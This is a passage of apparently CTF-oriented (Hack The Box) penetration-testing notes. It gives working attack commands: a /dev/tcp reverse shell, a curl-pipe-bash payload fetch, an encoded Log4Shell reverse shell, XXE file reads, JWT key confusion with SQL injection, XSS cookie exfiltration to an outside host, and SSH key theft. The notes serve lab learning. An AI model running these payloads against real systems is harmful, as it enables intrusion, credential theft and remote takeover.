<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://unika.htb/index.php?page=\\10.1.2.3\blabla\</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="reverse-shell-">Reverse shell <a name="reverse-shell"></a><a href="#reverse-shell-" class="hash-link" aria-label="Direct link to reverse-shell-" title="Direct link to reverse-shell-">​</a></h3>
<p>Reverse basically means that it is the target that will initiate a connection request back us (the attacker).</p>
<p>For example, once we have remote code execution in the target, we&#x27;ll be able to download and execute a piece of code.</p>
<p>Usually the process is:</p>
<ol>
<li>Create a file in the attacker machine containing a reverse shell payload:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1</span><br></span></code></pre></div></div>
<ol start="2">
<li>Create a server in the attacker machine which will act as the shell I/O. Normally this is done with <code>netcat</code>.</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc -nvlp 1337</span><br></span></code></pre></div></div>
<ol start="3">
<li>Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 8000</span><br></span></code></pre></div></div>
<ol start="4">
<li>Make the target machine download and execute the reverse shell payload:</li>
</ol>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash</span><br></span></code></pre></div></div>
<p>You can find a list of reverse shells here: <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer">https://www.revshells.com/</a></p>
<p>Once you have shell access, most likely it will not be interactive and you&#x27;ll miss many functionalities. You can try to get a improve the shell if python is installed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL+Z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre></div></div>
<p>Or, you can find mmore methods to improve the shell here <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener noreferrer">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="rogue-servers-">Rogue servers <a name="rogue"></a><a href="#rogue-servers-" class="hash-link" aria-label="Direct link to rogue-servers-" title="Direct link to rogue-servers-">​</a></h3>
<p>The idea of rogue server is to start a server in the attacker machine and make the target machine speak with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="ntlm-">NTLM <a name="ntlm"></a><a href="#ntlm-" class="hash-link" aria-label="Direct link to ntlm-" title="Direct link to ntlm-">​</a></h4>
<p>Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.</p>
<p>In order to mess with it, you might use the <a href="https://github.com/lgandx/Responder" target="_blank" rel="noopener noreferrer">responder</a> tool.</p>
<p>The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by <code>responder</code> tool). This tool will capture the authentication challenge hash and then you can use <code>john</code> tool to compare the hash with a dictionary to see if any entry matches.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="log4jshell-">Log4jShell <a name="log4j-shell"></a><a href="#log4jshell-" class="hash-link" aria-label="Direct link to log4jshell-" title="Direct link to log4jshell-">​</a></h4>
<p>It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from <a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreferrer">https://github.com/veracode-research/rogue-jndi</a> in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.</p>
<p>E.g.:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;</span><br></span></code></pre></div></div>
<p>Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.</p>
<p>Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xml-external-entities-xxe">XML eXternal Entities (XXE)<a href="#xml-external-entities-xxe" class="hash-link" aria-label="Direct link to XML eXternal Entities (XXE)" title="Direct link to XML eXternal Entities (XXE)">​</a></h3>
<p>If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.</p>
<p>This attack works because the XML parsers usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.</p>
<p>In order to check if the machine is vulnerable to this attack, you can try to show the contents of <code>/etc/hosts</code>(Linux) or <code>C:/Windows/System32/drivers/etc/hosts</code>(Windows). e.g.:</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token prolog" style="color:#999988;font-style:italic">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">&lt;!</span><span class="token doctype doctype-tag" style="color:#999988;font-style:italic">DOCTYPE</span><span class="token doctype" style="color:#999988;font-style:italic"> </span><span class="token doctype name" style="color:#999988;font-style:italic">foo</span><span class="token doctype" style="color:#999988;font-style:italic"> </span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">[</span><span class="token doctype internal-subset" style="color:#999988;font-style:italic"> &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &gt;</span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">]</span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">order</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">quantity</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">2</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">quantity</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">item</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token entity named-entity" style="color:#36acaa">&amp;xxe;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">item</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">address</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">Fake street 1234</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">address</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">order</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-key-confussion-attack">JWT Key confussion attack<a href="#jwt-key-confussion-attack" class="hash-link" aria-label="Direct link to JWT Key confussion attack" title="Direct link to JWT Key confussion attack">​</a></h3>
<p>JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...</p>
<p>They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.</p>
<p>This signing and verifing is very important because it ensures that nobody modifies the tokens.</p>
<p>However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we&#x27;re using symmetric algorithm.</p>
<p>See the following example:</p>
<p>In the received side, the token is verified using symmetric and asymmetric algorithms:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">async</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">token</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword control-flow" style="color:#00009f">await</span><span class="token plain"> jwt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">verify</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">token</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> publicKey</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token literal-property property" style="color:#36acaa">algorithms</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;RS256&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;HS256&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.</p>
<p>This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> fs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;fs&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> jwt </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;jsonwebtoken&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> publicKey  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">readFileSync</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./public.key&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;utf8&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> validJwtToken  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">readFileSync</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./jwt-token.txt&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;utf8&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> jwt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">verify</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">validJwtToken</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> publicKey</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token literal-property property" style="color:#36acaa">algorithms</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;RS256&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;username&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;admin&#x27; AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">re_encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> jwt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">sign</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decoded</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> publicKey</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token literal-property property" style="color:#36acaa">algorithm</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;HS256&#x27;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">re_encoded</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Here, we are using the public key to verify the received token, as the regular way.</p>
<p>Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.</p>
<p>In this case, we are modifying the token to retrieve something from the database using an SQL injection.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="cross-site-scripting-xss-">Cross-Site Scripting (XSS) <a name="xss"></a><a href="#cross-site-scripting-xss-" class="hash-link" aria-label="Direct link to cross-site-scripting-xss-" title="Direct link to cross-site-scripting-xss-">​</a></h3>
<p>This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.</p>
<p>Let&#x27;s imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.</p>
<p>E.g.</p>
<ol>
<li>Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):</li>
</ol>
<div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">fetch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;https://ojm5l9c8.requestrepo.com/?&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<ol start="2">
<li>Write the XSS HTML code in the input form field:</li>
</ol>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value" style="color:#e3116c">https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<ol start="3">
<li>In the remote url (requestrepo), you&#x27;ll see the value of the <code>document.cookie</code></li>
</ol>
<p>There&#x27;s a security header in modern browsers to prevent this <code>Content Security Policy (CSP)</code>. However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-hijacking">Cookie hijacking<a href="#cookie-hijacking" class="hash-link" aria-label="Direct link to Cookie hijacking" title="Direct link to Cookie hijacking">​</a></h3>
<p>If you see the application has some cookies and you somehow got access to a privileged cookie, you just need to change it in your browser and you&#x27;ll access as the privileged user.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="foothold-we-are-in">Foothold, we are in<a href="#foothold-we-are-in" class="hash-link" aria-label="Direct link to Foothold, we are in" title="Direct link to Foothold, we are in">​</a></h2>
<p>At this point we have shell (or reverse) access to the target machine. Now we are in the machine, but we don&#x27;t have much access, probably we&#x27;re logged in as a user that can&#x27;t do much and have access to few places.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="list-users-and-groups">List users and groups<a href="#list-users-and-groups" class="hash-link" aria-label="Direct link to List users and groups" title="Direct link to List users and groups">​</a></h3>
<p>We might discover other users of the machine.</p>
<p>In Linux, you can query all the available users in the target by querying <code>/etc/passwd</code>.</p>
<p>To retrieve the details about the current shell user, you can do <code>id</code> command. It will list the groups that the user belong. This might be useful for privilege escalation.</p>
<p>You can also list the binaries the user or group has access:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -group bugtracker 2&gt;/dev/null</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-for-interesting-keywords">Search for interesting keywords<a href="#search-for-interesting-keywords" class="hash-link" aria-label="Direct link to Search for interesting keywords" title="Direct link to Search for interesting keywords">​</a></h3>
<p>You can search inside the contents of files for interesting contents (passwords):</p>
<p>Let&#x27;s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep -Ril &#x27;passwd*&#x27; /var/www/html</span><br></span></code></pre></div></div>
<ul>
<li>-R recursive</li>
<li>-i ignore case</li>
<li>-l show the file, not the match</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="local-port-forwarding">Local port forwarding<a href="#local-port-forwarding" class="hash-link" aria-label="Direct link to Local port forwarding" title="Direct link to Local port forwarding">​</a></h3>
<p>Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.</p>
<p>With the next command, we&#x27;ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh -L 5432:localhost:5432 christine@funnel.htb</span><br></span></code></pre></div></div>
<p>and now you can access <code>funnel.htb:5432</code> in <code>localhost:5432</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="lateral-movement">Lateral movement<a href="#lateral-movement" class="hash-link" aria-label="Direct link to Lateral movement" title="Direct link to Lateral movement">​</a></h3>
<p>Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc... to switch from a low-permission user to a user with more permissions. That&#x27;s called lateral movement and it&#x27;s a step forward privilege escalation.</p>
<p>Also part of lateral movement is to use the machine as a pivot to enumerate more network devices. Typically this is done for enterprise level pentesting. Once a machine is compromised, you can access the machines in the same network even if they don&#x27;t have public access.</p>
<p>Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the <code>.ssh</code> folder in the user home:</p>
<ul>
<li>/home/michael/.ssh/id_rsa</li>
<li>c/users/daniel/.ssh/id_rsa</li>
</ul>
<p>Paste the contents of that private key into the attacker machine and run:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 400 michael-id-rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh -i michael-id-rsa michael@target.htb</span><br></span></code></pre></div></div>
<p>An interesting option for lateral movement is checking the values set in the environment variables:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5d711b9d670a:/metabase.db$ env</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">env</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SHELL=/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_DB_PASS=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HOSTNAME=5d711b9d670a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LANGUAGE=en_US:en</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_JETTY_HOST=0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JAVA_HOME=/opt/java/openjdk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_DB_FILE=//metabase.db/metabase.db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PWD=/metabase.db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LOGNAME=metabase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_EMAIL_SMTP_USERNAME=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HOME=/home/metabase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LANG=en_US.UTF-8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">META_USER=metalytics</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">META_PASS=An4lytics_dsXXXX#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_EMAIL_SMTP_PASSWORD=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">USER=metabase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SHLVL=4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_DB_USER=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FC_LANG=en-US</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LC_CTYPE=en_US.UTF-8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_LDAP_BIND_DN=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LC_ALL=en_US.UTF-8</span><br></span><span class="token-line" 